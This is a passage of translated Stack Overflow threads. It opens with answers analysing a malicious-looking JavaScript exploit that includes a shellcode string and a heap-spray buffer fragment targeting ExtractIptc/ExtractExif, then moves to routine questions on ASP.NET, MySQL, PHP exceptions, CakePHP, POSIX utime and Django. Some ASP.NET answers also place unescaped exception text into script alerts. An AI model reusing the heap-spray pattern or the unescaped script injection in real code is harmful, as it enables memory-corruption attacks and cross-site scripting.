有效载荷代码是如果漏洞利用成功，计算机将执行的代码，它就是您在脚本开头看到的内容`(\x43\x43\x43\x43\n....\xEF)`。它被编码为特定 CPU 架构和操作系统的[shell 代码。](https://stackoverflow.com/questions/1469559/help-me-understand-this-c-code-void-scode)这意味着已经编译、独立并且可以直接通过管道传输到 CPU 的代码。如果您对此进行解码，您可能会发现一些接近机器代码的内容。这可能没有什么积极的。

该`hex(num,width)`函数将十进制数转换为其十六进制形式。我已经单独测试了这个函数，它在输入 1000 时返回 3E8。如果生成的十六进制数大于指定的值，则宽度变量仅用于退出脚本。

关于这部分：

```
var buf = addr(0x0c0c0c0c);
buf = buf.substring(0,400);
obj.ExtractIptc = buf;
obj.ExtractExif = buf; 
```

buf 变量是一个缓冲区。缓冲区只不过是内存中的数据。它可以作为字符串接口，如此代码所示。我的猜测是，从内存中 0x0c0c0c0c 的任何内容创建一个 400 字节的缓冲区，然后输入两个函数。

这里缺少几个函数定义。即，hav() 函数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:34:02.953

我尽可能多地修复了格式，但似乎仍然缺少大块。至少，我看到了语法错误、未初始化的变量等。

如果这是实际工作代码，请编辑您的问题并（使用“代码”按钮“101/010”或仅缩进 4 个空格而不是用“”按钮引用）发布实际代码，以便我们看到的内容与您的内容相匹配正在看到。**编辑：不要尝试运行此代码！它可能是恶意的。**

如果它不是工作代码，那么你的答案就是：它不起作用，所以试图弄清楚它是如何工作的是没有意义的。

# c# - 如何在Web应用程序asp.net c#中显示错误消息框

> ID：651592
> 
> 赞同：9
> 
> 时间：2009-03-16T18:22:27.630
> 
> 标签：c#, asp.net, web-applications, messagebox

我有一个 ASP.NET Web 应用程序，我想知道在引发异常时如何显示错误消息框。

例如，

```
 try
        {
            do something
        }
        catch 
        {
            messagebox.write("error"); 
            //[This isn't the correct syntax, just what I want to achieve]
        } 
```

[消息框显示错误]

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-03-16T18:25:27.437

您无法在客户端计算机或服务器上合理地显示消息框。对于客户端的计算机，您需要重定向到带有适当错误消息的错误页面，如果需要，可能包括异常消息和堆栈跟踪。在服务器上，您可能想要对事件日志或日志文件进行一些日志记录。

```
 try
 {
     ....
 }
 catch (Exception ex)
 {
     this.Session["exceptionMessage"] = ex.Message;
     Response.Redirect( "ErrorDisplay.aspx" );
     log.Write( ex.Message  + ex.StackTrace );
 } 
```

请注意，上面的“日志”必须由您实现，可能使用 log4net 或其他一些日志记录实用程序。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-03-16T18:26:39.880

您不能只调用 messagebox.write ，因为您已与客户端断开连接。您应该注册显示消息框的 javascript 代码：

```
this.RegisterClientScriptBlock(typeof(string), "key",  string.Format("alert('{0}');", ex.Message), true); 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-03-16T18:28:50.937

使用 MessageBox.Show() 将导致消息框显示在服务器中并停止线程处理进一步的请求，除非该框已关闭。

你能做的是，

```
this.Page.ClientScript.RegisterStartupScript(this.GetType(),"ex","alert('" + ex.Message + "');", true); 
```

如果异常没有冒泡，这将在客户端显示异常。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-03-16T18:27:05.513

我过去这样做的方法是在抛出异常时用信息填充页面上的某些内容。MessageBox 用于 Windows 窗体，不能用于 Web 窗体。我想你可以在页面上放一些 javascript 来发出警报：

```
Response.Write("<script>alert('Exception: ')</script>"); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T18:28:27.397

我认为您不想显示异常的详细信息。我们不得不停止这样做，因为我们的一位客户不希望他们的用户看到异常详细信息中可用的所有内容。尝试显示一个 javascript 窗口，其中包含一些说明存在问题的信息。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2011-06-26T05:47:51.927

如果您想在一个地方处理所有错误，您可以使用 web 应用程序的 global.asax 文件（也称为全局应用程序文件），并处理应用程序错误事件。首先你将全局应用程序文件添加到你的项目中，然后在 Application_Error 事件中放置一些错误处理代码，如下所示：

```
 void Application_Error(object sender, EventArgs e) 
{
    Exception objErr = Server.GetLastError().GetBaseException();
    string err = "Error Caught in Application_Error event\n" +
            "Error in: " + Request.Url.ToString() +
            "\nError Message:" + objErr.Message.ToString() +
            "\nStack Trace:" + objErr.StackTrace.ToString();
    System.Diagnostics.EventLog.WriteEntry("Sample_WebApp", err, System.Diagnostics.EventLogEntryType.Error);
    Server.ClearError();
    Response.Redirect(string.Format("{0}?exceptionMessage={1}", System.Web.VirtualPathUtility.ToAbsolute("~/ErrorPage.aspx"), objErr.Message));
} 
```

这会将您的异常的技术细节记录到系统事件日志中（如果您需要稍后检查错误）然后在您的 ErrorPage.aspx 上，您从 Page_Load 事件的查询字符串中捕获异常消息。如何显示它取决于您（您可以使用其他答案中建议的 javascript 警报或简单地将文本传递给 asp.net 文字

希望他的帮助。干杯

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-03-24T14:28:43.053

如果您将 .NET Core 与 MVC 和 Razor 一起使用，则在呈现页面之前需要进行多个级别的预处理。然后我建议您尝试在视图页面顶部包装一条条件错误消息，如下所示：

在 ViewController.cs 中：

```
if (file.Length < 800000)
{
    ViewData["errors"] = "";
}
else
{
    ViewData["errors"] = "File too big. (" + file.Length.ToString() + " bytes)";
} 
```

在 View.cshtml 中：

```
@if (ViewData["errors"].Equals(""))
{
    @:<p>Everything is fine.</p>
}
else
{
    @:<script>alert('@ViewData["errors"]');</script>
} 
```

# c# - 你可以在一个事务中拥有多个 MySqlCommand 吗？

> ID：651594
> 
> 赞同：6
> 
> 时间：2009-03-16T18:23:07.410
> 
> 标签：c#, mysql, transactions

我想对 2 个单独的表进行插入和更新，但让它们在 1 个事务中）。

基本上在伪代码中我想做类似的事情：

```
MySqlTransaction trans = null;
try
{
    _Connection.Open();
    trans = _Connection.BeginTransaction();
    insertCmd.Transaction = trans;
    updateCmd.Transaction = trans;

    Int32 id = insertCmd.ExecuteNonQuery();
    updateCmd.Parameters.Add(new MySqlParameter("oid", MySqlDbType.Int32).Value = id);
    updateCmd.ExecuteNonQuery();
}
catch(MySqlException)
{
    if(trans != null)
        trans.RollBack();
}
finally
{
    _Connection.Close();
} 
```

这是可能的还是我走错了路？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T18:37:19.653

是的，如果：

*   所有的表都支持它，（InnoDB 表支持它，但 MyIsam 表不支持）
*   查询不会影响数据库模式。（ALTER TABLE、DROP TABLE、CREATE TABLE 等导致事务提交）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T18:26:22.753

是的，您可以在单个事务中执行多个命令。这将让您完全按照您正在尝试执行的操作：所有命令，或者一个都不执行。

# oop - OCaml 直接对象的 UML

> ID：651599
> 
> 赞同：3
> 
> 时间：2009-03-16T18:24:58.433
> 
> 标签：oop, uml, ocaml, anonymous

我在 OCaml 中创建了一个直接对象。

```
let x = 
object (self)
val dataMember = 3
method aMethod = print_endline "Called a method"
end;; 
```

由于对象没有名称（它被认为是匿名的吗？），它如何在 UML 中正确表示？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-24T03:38:56.627

这是我发现的。我会按照下面的图片（如果可以的话），但首先进行一些讨论。在 UML 中命名某些东西并不意味着它在实现中不能是匿名的。我更难以将它显示在另一个类的“内部”，因此下面使用的包/组件包含行。您还可以使用实例化连接来显示您要查找的内容。您也可以使用组件，因为它们允许包含。最后，虽然我很伤心，为什么要为匿名类建模，因为它不是结构的一部分，因为您永远不会在类之外引用它（IN GENERAL），而是更多的行为。因此，为什么实例和属性允许匿名元素。如果你开始为 LISP 等建模，这个问题会变得非常有趣。

**UML 2.0 的最新版本：（** [来源：][[informit.com](http://www.informit.com/content/images/chap3_0131428489/elementLinks/03fig22.gif)][）][![匿名类示例](https://i.stack.imgur.com/acCrO.gif)](https://i.stack.imgur.com/acCrO.gif)

***请注意***，它是图 3.22，并且作者说“Stereotype”这是不正确的，因为它不是语言的一部分，所以它是一个关键字，这意味着不是正式模型的一部分，任何旧字符串。并非所有工具都支持这种表示法，但 RSA/RSM 确实让我感到惊讶，并且使用了接近这种表示法的东西。

[源页面 - http://www.informit.com/articles/article.aspx?p=336264&seqNum=3](http://www.informit.com/articles/article.aspx?p=336264&seqNum=3)

从 UML 规范本身：

对于属性 - 属性符号可能显示为在其名称字符串中仅包含一个名称（不带冒号）。这意味着嵌套在包含类的名称空间中的匿名命名类的定义。该部件有这个匿名类作为它的类型。匿名类的每次出现都不同于其他任何出现。匿名定义的类具有用部件符号指定的属性。允许显示定义匿名类的属性和操作的隔间。

For Instances - （名称对于实例是可选的）未命名分类器的匿名实例规范的标准符号是带下划线的冒号 (':')。如果实例规范具有值规范作为其规范，则值规范显示在名称后面的等号（“=”）之后，或者在名称下方不带等号。如果使用包含名称的封闭形状（例如矩形）显示实例规范，则值规范显示在封闭形状内。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T18:41:52.840

您可以给它一个随机名称，或其他一些公式值。在这种情况下，“正确”实际上只是意味着清楚的东西。国际 UML 标准机构或任何东西都没有“正确答案”。

如果您想要一个更具体的答案，为什么不将其称为`Anonymous_foo_mungler`“ ”，如果它*不是*匿名的`foo_mungler`，则将其替换为您会给它的描述性名称。

 *# .net - 特性 - NHibernate 与编写自定义对象关系映射器

> ID：651608
> 
> 赞同：2
> 
> 时间：2009-03-16T18:28:02.170
> 
> 标签：.net, nhibernate, orm

我正在寻找您将在自定义对象关系映射器 (ORM) 中实现的所有功能的列表，以满足 NHibernate 的所有功能。

开始：

1.  通过不同的驱动程序和方言实现数据库可移植性
2.  缓存
3.  延迟加载
4.  自定义 SQL
5.  查询接口 - LINQ, Criteria, QBE (Query By Example)
6.  基本和高级映射功能（例如鉴别器列、*示例*）
7.  支持事务和工作单元
8.  [多标准](http://ayende.com/Blog/archive/2007/05/20/NHibernate-Multi-Criteria.aspx)
9.  [多查询](http://ayende.com/Blog/archive/2006/12/05/NHibernateMutliQuerySupport.aspx)
10.  配料
11.  补充/覆盖功能的挂钩

<在此处插入您的>

在此处查看另一个列表：[不编写自己的对象关系映射器的 25 个理由](http://ayende.com/Blog/archive/2006/05/12/25ReasonsNotToWriteYourOwnObjectRelationalMapper.aspx)，来自 Ayende Rahien

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T21:28:57.243

Ayende 在此处发布了一个近乎完整的重要 ORM 功能列表：http: [//ayende.com/Blog/archive/2006/05/12/25ReasonsNotToWriteYourOwnObjectRelationalMapper.aspx](http://ayende.com/Blog/archive/2006/05/12/25ReasonsNotToWriteYourOwnObjectRelationalMapper.aspx)

您的列表中缺少的一项重要功能是 IsDirty/State Change 检查。Identity Map 是另一个重要的功能，它支持许多其他功能，例如 IsDirty。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T20:27:37.923

多查询，

批处理。

最重要的是：钩子来补充/覆盖以你没想到/想要/感觉的方式工作的任何功能。

最后一部分是 NHibernate 擅长的地方。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T20:14:06.393

某种查询接口（如 linq 或 Criteria）

某种映射功能

支持事务和工作单元

# php - 使用 try {} catch {} 与 if {} else {} 相比有什么优势？

> ID：651619
> 
> 赞同：74
> 
> 时间：2009-03-16T18:31:39.947
> 
> 标签：php, mysql, pdo

我正在从 php 中的普通 mysql 切换到 PDO，我注意到测试错误的常用方法是使用 try / catch 组合而不是 if / else 组合。

该方法的优点是什么，我可以使用一个 try / catch 块而不是几个嵌套的 if / else 块来处理不同步骤（连接、准备、执行等）的所有错误吗？

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2009-03-16T18:41:38.723

当通过代码的正常路径应该没有错误地进行时，我会使用 try/catch 块，除非确实存在一些异常情况——比如服务器关闭、您的凭据过期或不正确。我不一定会用它来处理非异常错误——比如当前用户没有扮演正确的角色。也就是说，当您可以合理地预期并处理不是异常情况的错误时，我认为您应该进行检查。

在您所描述的情况下——设置和执行查询，try/catch 块是处理它的好方法，因为您通常期望查询成功。另一方面，您可能希望检查结果的内容是否符合您对控制流逻辑的期望，而不是仅仅尝试使用可能对您的目的无效的数据。

您要注意的一件事是草率地使用 try/catch。Try/catch 不应该用来保护自己免受不良编程的影响——“我不知道如果我这样做会发生什么，所以我将把它包装在 try/catch 中并希望最好的”类型的编程。通常，您会希望将捕获的异常类型限制为与代码本身无关的异常（服务器停机、错误凭据等），以便您可以找到并修复与代码相关的错误（空指针等） .)。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2009-03-16T18:35:01.017

一般来说，try-catch 块很棒，因为只要发生异常，它们就会中断（移动到 catch 语句）。If-else 块依赖于您预测错误何时发生。

编辑：此外，当遇到错误时，catch 块不会阻止您的代码停止。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2009-03-16T18:51:30.227

try/catch 和一般异常的优势更多地适用于**开发**像 PDO 这样的库的人。它们允许系统开发人员以快速简单的方式处理未定义的情况或意外结果。建立数据库连接。如果无法访问数据库，系统**应该怎么做。**它应该停止执行吗？再试一次？发出警告并继续？系统开发人员不知道你需要它做什么，他们会抛出一个异常，你稍后会捕获并处理它。

对您来说，作为系统的消费者，您的优势不是得到一些模糊的错误代码，或者是一个简单的布尔错误，它失败了，你得到一个异常对象，它将

1.  以这样的方式命名，以便更明显地出错（如果我没记错的话，PDO 只有一种异常类型，但其他系统包含多种异常类型，用于不同类型的错误）

2.  可能/应该包含可以帮助您找出引发异常的**原因的方法和属性**

无论如何，这就是理论。有很多聪明人声称例外是要走的路。也有很多聪明人认为异常是魔鬼，是懒惰的系统开发者的拐杖。在这个问题上没有任何类似的共识。

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2009-03-16T18:41:33.013

与大多数其他原始操作相比，抛出和捕获异常是一项昂贵的操作。如果这是一段需要良好执行的代码（例如，在一个紧密的循环中），您将需要查看您的用例 - 如果您希望相对频繁地抛出异常，那么使用 if 会更好/else 性能方面（除非底层代码只是为您包装了一个异常，在这种情况下根本没有任何收益）。如果仅在极少数情况下抛出异常，那么最好使用 try/catch 以避免在紧密循环中分支的开销。

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2009-03-16T18:39:43.953

@Perchik：

我的错误处理的一般理念：

您*应该*使用 if / else 来处理您期望的所有情况。您不应该*使用*try {} catch {} 来处理*所有事情*（在大多数情况下），因为可能会引发有用的异常，并且您可以从中了解是否存在错误。在您怀疑某些事情可能/将会出错并且您不希望它导致整个系统崩溃的情况下，您*应该*使用 try {} catch {}，例如网络超时/文件系统访问问题、文件不存在等.

[令人烦恼的异常](http://blogs.msdn.com/ericlippert/archive/2008/09/10/vexing-exceptions.aspx)

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2009-03-16T18:39:13.627

Try/Catch 将错误处理逻辑与对象业务逻辑完全分离。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2009-03-16T18:35:54.757

这正是优势，使用一个 try/catch 而不是多个 if 语句。您还可以捕获任何未预料到的错误。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2009-03-16T19:27:16.430

其他人都有很好的答案——但我想我会自己回答：

1.  Try/Catch 是一种实际的异常处理机制——因此，如果您更改异常，它将自动适用于所有 try/catch 语句。
2.  Try/Catch 提供了运行代码的机会，即使在可能会杀死 if/else 的重大异常的情况下，此外，可以回滚 try 语句（如果您精明的话）。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2009-03-16T18:38:06.343

由于 PDO 正在使用对象，因此如果发生错误，它们会引发异常。旧的 mysql/mysqli 只是函数，不会抛出异常，它们只是返回错误代码。当可以从代码中抛出异常时使用 Try/catch，并且您在 catch 子句中捕获它，这是一种处理错误的面向对象的方式。你不能用 if/else 块捕获异常——它们与 try/catch 没有任何共享。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2017-11-11T07:44:05.957

在php中通过使用带有继承的Try Catch，我们可以从另一个类中抛出异常。

示例：-我正在使用`controller`并验证用户数据`Models`。

如果触发任何错误，我只需要从`Model`方法中抛出异常。

try 中的执行将中断并在`Catch`Block 中捕获。

所以返回布尔值和检查的开销更少。

除此之外，在链中（在另一个内部）`Try Catch`使用时效果很好。`Try - Catch``Try - Catch`

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2020-05-12T21:56:53.797

十多年前，这个问题就在错误的前提下被提出。实际上，如果和尝试是无法比拟的。可悲的是，但直到今天，人们灾难性地将**异常**与**try catch**混淆，认为一个与另一个密不可分。

在询问的方式中，实际上将 if {} 更改为 try {} 的意义在于强制尝试包装一行代码以测试错误。

然而，实际的问题是使用***异常****与 if {} else {} 相比有**什么优势。*

 **并且它立即开始变得有意义：异常允许**自动错误报告**，**此时既不需要编写 try catch 也不需要编写 if else**。

异常本质上是一种**自动化**的编写方式，`if ($result == FALSE) raise_error();`如果没有异常，您必须手动测试每个操作的结果。使用异常重新创建相同的行为只是愚蠢的。在大多数情况下，应该不理会抛出的异常，除非有特定的处理场景。在所有其他情况下，它必须在其他地方冒泡，因此**不必编写 try {} catch {}。**

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2018-11-06T16:08:55.363

假设我们正在编写一个 a/b 除法代码，并且发生了最著名的异常情况，即 0 除法错误，您认为接下来可以做什么？1.您可以打印一条消息并退出。2.您可以打印一条消息并让用户重新输入值等。

在某些情况下，不同的人/供应商希望以不同的方式处理相同的异常情况。*catch*块让他们轻松地做到这一点。如果您需要更改处理某个异常情况的方式，您只需要更改 catch 块。

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2020-05-12T20:32:06.323

TRY/CATCH 可以在您对错误信息很少或您认为可能会发生的编程上下文中使用，例如。

```
#include <iostream>
using namespace std;

int main (){
    try{
        while(true){
            new int[100000];
        }
    }
    catch(bad_alloc& e){
       cout << e.what() << endl;
     }
 } 
```

虽然程序中没有语义或编译时错误，但可以理解的是，当您尝试连续分配内存并且程序耗尽内存时，它会出现“bad_alloc”的运行时错误。这个异常定义在 bad_alloc 标准类中，它是类“Exception”的子类，因为它抛出一个隐式异常，所以这里没有隐含 throw 关键字。

也可以使用 try/catch 来检查文件是否被误删除，也可以使用 if/else 来检查文件是否存在，两者各有优势。

* * *

## 回答 #14

> 赞同：-2
> 
> 时间：2019-11-06T17:40:09.453

当函数之间存在通信时，Try 和 Catch 函数很有用。在 Try 和 Catch 中，如果 TRY 块中存在异常，则控制将直接转移到 CATCH 块，该块将存储我们的异常条件。然而，这在 IF ELSE 的情况下是不可能的，在 IF 条件下，如果存在异常，无论如何控制都不能转到 ELSE 块。

```
int division(int a,int b){
    if(b==0)
       throw 101;
    return a/b;
}

int main()
{
    int a=10,b=0,c;
    try{
        c=division(a,b);
        cout<<c<<endl;
    }
    catch(int a){
        cout<<"Division not possible by 0"<<endl;
   }
} 
```

考虑以下代码： throw 和 catch 函数用于函数划分和主函数之间的通信。请注意，当 b 为 0 时，不执行打印 c 的语句，因为在抛出值 os 后，控件直接转移到 catch 块。然而，如果这里是 IF ELSE，这是不可能的。

# web-services - CXF 动态客户端 API - getUnwrapperOperation、getWrappedOperation

> ID：651625
> 
> 赞同：0
> 
> 时间：2009-03-16T18:33:38.227
> 
> 标签：web-services, api, cxf

```
QName opName = new QName("http://mycompany.com/soap/service", "Login");
BindingOperationInfo boi = binding.getOperation(lastOperation);
boi = boi.getUnwrappedOperation();
boi = boi.getWrappedOperation(); 
```

谁能向我解释 getUnwrappedOperation() 与 getWrappedOperation() 之间的区别？包裹着什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-23T18:39:33.537

差异取决于您“希望”如何使用该操作。使用 Doc/Literal 端点，大多数使用“包装”形式，最终得到如下模式：

使用名为“doStuff”的操作，该操作将上述内容作为输入消息中的单个元素部分。

当您使用“unwrapped”操作调用客户端时，运行时将期望您发送 3 个参数，一个 String、一个 int 和一个 String。使用包装的操作，运行时将期望您发送一个包含数据的“DoStuffRequest”对象。

基本上，它只取决于您计划如何使用该操作以及它如何匹配您的数据集。

# php - PHP 和 Xvfb 的使用

> ID：651628
> 
> 赞同：5
> 
> 时间：2009-03-16T18:34:27.290
> 
> 标签：php, linux, terminal, xvfb

我正在尝试在无头服务器上执行 Firefox 以截取网站的屏幕截图。我可以从终端使用

“DISPLAY=:12 firefox -saveimage [http://www.google.com/](http://www.google.com/) ”。

问题是当我尝试做 system("DISPLAY=:12 firefox -saveimage [http://www.google.com](http://www.google.com) "); 不起作用。我有一种感觉，它没有在正常的 shell 环境中执行。我违背了我更好的判断，给了 apache 用户一个实际的 shell。如果我 su 到 apache 并执行命令，一切都很好并且按预期工作，但它再次不能通过系统调用工作。任何见解都非常受欢迎。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T21:10:02.780

我找到了解决方案。

我只需要创建一个会为我调用它的 shell 脚本。在玩了一段时间后，我`export HOME="/var/www/"`在脚本顶部添加后让它工作了。

我希望这对其他人有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T18:36:16.567

很可能对您作为 shell 用户设置的环境变量存在一些依赖关系，而 httpd 的环境不满足这些依赖关系。不过，在对环境做任何英雄事之前，我建议从你的工作中捕获 stderr（**`2>/tmp/imgcaperrlog`**例如，通过添加到它的末尾）并查看它是否有任何抱怨。

# iphone - iPhone加速度计确定运动

> ID：651630
> 
> 赞同：2
> 
> 时间：2009-03-16T18:34:45.603
> 
> 标签：iphone, accelerometer

使用加速度计输出，我如何确定用户（iphone 安装在腰部）是否正在行走？

寻找一种好的算法来确定用户是否正在步行来确定活动转换——站立到步行或步行到站立。

请帮忙。

感谢您的时间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T19:24:50.397

对于之前的项目，我尝试计算加速度矢量的大小，并将阈值设置为大约 2g，这在测试中效果很好。典型的（硬件）计步器会忽略相隔超过一秒的单次颠簸，这似乎是过滤掉非“行走”的偶尔运动的好方法。

此外，您可以通过检查数据一段时间来自动调整阈值。

# php - 如何防止 CakePHP 中的重复/重复表单提交？

> ID：651644
> 
> 赞同：5
> 
> 时间：2009-03-16T18:39:43.203
> 
> 标签：php, cakephp

我发现 CakePHP 中的安全组件通过将标记作为隐藏值添加到表单来帮助防止 CSRF。

我想知道是否有任何方法可以防止使用此组件或其他一些组件/帮助程序提交重复的表单？

在以前的项目中，我使用了保存在会话中的唯一哈希，在提交时读取然后删除。重复提交将具有相同的哈希值并且会产生错误。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-04-07T19:03:21.220

我已经放置了禁用按钮的 onClick 事件，如下所示：

```
<?= $this->Form->button('Salvar', [
                    'value' =>'Submit', 
                    'onClick' => 'form.submit();this.disabled=true'
]) 
?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T22:45:33.113

您可以在 Cake 中实现与以前相同类型的东西。

在提交时，设置一个会话变量，将该表单标记为已提交。确保在它之后加上到期时间（几秒钟内就可以了）。如果在您处理表单时会话变量存在（并且您在过期时间内），那么您需要重新提交，所以不要保存表单数据。

我建议在模型的 save(..) 方法中执行此操作，因此您不必担心将其添加到多个代码位置。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-06T13:35:13.143

CakePHP 2.x 中的安全组件有一个特性，允许您选择使用相同的安全令牌直到它过期或只使用一次。把它放在你的控制器 beforeFilter 方法中：

```
$this->Security->csrfUseOnce = true; 
```

[在此处](http://book.cakephp.org/2.0/en/core-libraries/components/security-component.html)查找更多信息

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-07-14T22:32:24.957

@DoctorFox 已经回答了这个问题`csrfUseOnce = true`，但这会让你陷入你仍然必须管理的黑洞。所以对我来说完整的解决方案是：

```
class YourAppController extends AppController {

    public $helpers = array('Html', 'Form');
    public $components = array('Security');

    public function beforeFilter() {
        $this->Security->csrfUseOnce = true;
        $this->Security->blackHoleCallback = 'blackhole';
    } 

    public function blackhole($type) {
        $this->redirect(array('action' => 'index'));
    } 
```

如果没有重定向，您仍然可以提交双重表单。

参考：[CakePHP 安全组件](http://book.cakephp.org/2.0/en/core-libraries/components/security-component.html)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-08-15T22:27:58.817

就做[PRG Pattern](http://en.wikipedia.org/wiki/Post/Redirect/Get) ..很简单吧？！好吧，至少每个人都是这么说的，但没有人给出明确的答案！我花了一周的时间搜索和挖掘，然后“新手”决定自己做点什么！这是在 cakephp 中执行此操作的一种方法（我使用 2.0.5）：

无论代码如何，这里的逻辑步骤都是：
1- 设置数据
2- 验证（还不要创建（））
3- 将 $this->request->data 写入会话变量
4- 重定向到 saveData 操作

内部 saveData 操作：
5- 读取并保存会话变量
6- 删除会话变量
7- create()
8- 将数据保存到模型
9- 重定向

这是您的代码可能看起来如何的示例。
**收件人：“ **ourController** ”和“ **ourModel** ”

```
public function add() {
        if ($this->request->is('post')) {
            if (isset($this->request->data)) {
                $this->ourModel->set($this->request->data);
                if ($this->ourModel->validates()) {
                    $this->Session->write('myData', $this->request->data);
                    $this->redirect(array('controller' => 'ourController', 
                                           'action' => 'saveData',
                                           'ourModel' //optional but recommended
                                          )
                                    );
                } else {
                    $this->Session->setFlash('ourModel could not be saved.');
                     }
          }
.....//the rest of add() function
} 
```

然后，您应该（在验证时）被重定向到此函数，该函数再次将您重定向到索引操作或您的逻辑将您带到的任何地方！

```
public function saveData($model) {
        $myData = $this->Session->read('myData');
        $this->Session->delete('myData'); //extremely important
        $this->$model->create();
        if ($this->$model->save($myData)) 
               // or $myData[$model] if you are dealing with multiple models
              {
              $this->Session->setFlash(__($model.' have been saved successfully'));
              $this->redirect(array('controller' => 'ourController',
                                    'action' => 'index'
                                    )
                               );
            } 
        } else{
            $this->Session->setFlash(__($model.' could not be saved'));
        }
        }
    } 
```

一个简单的自我重定向可能会起作用，但在大多数情况下，您希望重定向到不同的视图（例如，到另一个表单或索引视图）

我希望这种详细说明有助于节省其他人的时间，这样就不必浪费整整一周的时间（就像我的情况一样）只是为了在服务器端执行这样的功能！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T22:28:59.113

不了解 cake，但尽量不在 POST 请求中显示内容，进行自我重定向。双重职位将得到解决。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-02-10T02:05:35.477

安全组件应该可以工作，此外，您还可以在发布后取消设置数据：

```
unset($this->data['yourModel']); 
```

# c - 如何在 POSIX 中以编程方式编写文件修改日期？

> ID：651652
> 
> 赞同：13
> 
> 时间：2009-03-16T18:41:39.907
> 
> 标签：c, unix, file, posix

我想从 C 代码中*触摸*我的文件以修改它们的访问日期。这似乎不起作用：

```
struct stat fileSt;
lstat(path, &fileSt);
fileSt.st_mtime = time(NULL); 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-03-16T18:58:07.700

[utimes()](http://www.kernel.org/doc/man-pages/online/pages/man2/utimes.2.html)可能是怎么做的。utime() 已过时。

使用像 strace 这样的工具来确定这样的事情是微不足道的。

```
strace touch -t 01010911 xxx
.
.
open("xxx", O_WRONLY|O_NONBLOCK|O_CREAT|O_NOCTTY|O_LARGEFILE, 0666) = 0
utimes("/proc/self/fd/0", {1230829860, 0}) = 0 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-03-16T18:55:00.953

我想你想要`utime(2)`。这应该足够了：

```
utime(filename, NULL); 
```

文档说：

> ```
> int utime(const char *filename, const struct utimbuf *times); 
> ```
> 
> [...]
> 
> utime() 系统调用将filename 指定的inode 的访问和修改时间分别更改为时间的actime 和modtime 字段。
> 
> 如果 times 是`NULL`，则文件的访问和修改时间设置为当前时间。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-03-20T00:41:43.353

旧的`utime()`并且`utimes()`适用于许多用例，但是要更新`atime`&`mtime`具有现代系统所需的*纳秒分辨率*，请使用：

```
utimensat(0, path, NULL, 0); 
```

这与 newer 结合使用非常有用，`stat()`后者也返回具有纳秒分辨率的`struct timespec` `st_mtim`字段。`struct stat`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T18:56:40.167

我认为您需要查看 utime()/utimes() 系统调用。不是在我的普通电脑上，所以我担心无法查看详细信息。

# django - Django Admin：管理数据库

> ID：651661
> 
> 赞同：1
> 
> 时间：2009-03-16T18:44:44.097
> 
> 标签：django, django-models, django-admin

我正在使用 Django admin 来管理我的数据。我有以下表格：`Users`、`Groups`和`Domains`。与和`Users`都有多对多的关系。与 有一对多的关系。当我从 a中删除 a 时，我还想删除该特定且属于.`Groups``Domains``Domains``Groups``User``Domain``Users_Groups``User``Groups``Domain`

我该怎么做呢？我把代码放在哪里？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-17T14:07:51.010

我建议覆盖保存，但我猜你正在使用 django.contrib.auth.User 对象。在这种情况下，您可以使用 pre_save 信号完成大致相同的事情：

```
def manage_domains(signal,**kwargs):
    if kwargs.has_key('instance'):
        instance = kwargs['instance']
    else: return
    old_instance = User.objects.get(pk=instance.pk)
    instance_categories = instance.categories.all()
    for group in old_instance.groups.all():
        if group not in instance_categories:
            instance.groups.clear()
pre_save.connect(manage_domains, sender=User) 
```

这甚至不是一个有效的解决方案。会发生的是，当保存一个 User 对象时，会对内存中的对象进行上述更改，然后保存将覆盖数据库中的对象。您不仅遇到了麻烦，不仅要访问数据库以查明对象的未修改版本是否与您要保存的内容一致，而且还要遍历两个类别集，两者都需要数据库命中装载。

在这里提高效率的最好方法是对 ManyToMany 字段管理器本身进行子类化，因为这是关注内存中发生的变化，而不是仅仅在事后比较状态。但这会涉及更多，并且还需要您放弃内置的 User 对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T20:24:29.083

